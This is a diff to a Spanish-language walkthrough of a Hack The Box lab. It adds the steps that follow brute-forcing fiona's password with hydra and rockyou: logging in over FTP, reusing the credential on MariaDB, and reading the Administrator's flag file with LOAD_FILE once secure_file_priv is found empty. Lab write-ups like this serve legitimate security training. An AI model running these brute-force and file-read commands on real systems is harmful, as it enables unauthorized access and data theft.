@@ -191,7 +191,7 @@ hydra -l "fiona@inlanefreight.htb" -P passwords.list -f inlanefreight.htb pop3
 
 Pruebo la credencial "fiona" por FTP con el diccionario "rockyou" y me devuelve:
 ```
-hydra -l "fiona" -P /usr/share/wordlists/rockyou.txt ftp://10.129.172.173
+hydra -l "fiona" -P /usr/share/wordlists/rockyou.txt ftp://10.129.172.173 -t 1
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-20 10:51:16
@@ -202,5 +202,46 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-20 10:51:
 [21][ftp] host: 10.129.172.173   login: fiona   password: 987654321
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-20 10:52:28
+```
+
+Me conecto por FTP:
+```
+ftp fiona@10.129.134.140
+```
+
+Con credencial 987654321
+
+Y desactivo el modo pasivo del ftp con "passive off".
+
+Me descargo los archivos "docs.txt" y "WebServersInfo.txt".
+
+Observo que puedo hacer en el servidor "ftp" un put del archivo que quiera y este se ve reflejado en "10.129.134.140", pero no puedo ejecutar ninguna webshell desde ahí, puesto que solo me deja descargar archivos.
+
+Ejecuto:
+```
+mysql -u fiona -p'987654321' -h 10.129.203.7 --skip_ssl
+```
+
 
 ```
+MariaDB [(none)]> show variables like "secure_file_priv";
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set (0,048 sec)
+```
+
+Y finalmente ejecuto:
+```
+MariaDB [(none)]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
++------------------------------------------------------+
+| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
++------------------------------------------------------+
+| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
++------------------------------------------------------+
+1 row in set (0,054 sec)
+```
+
+
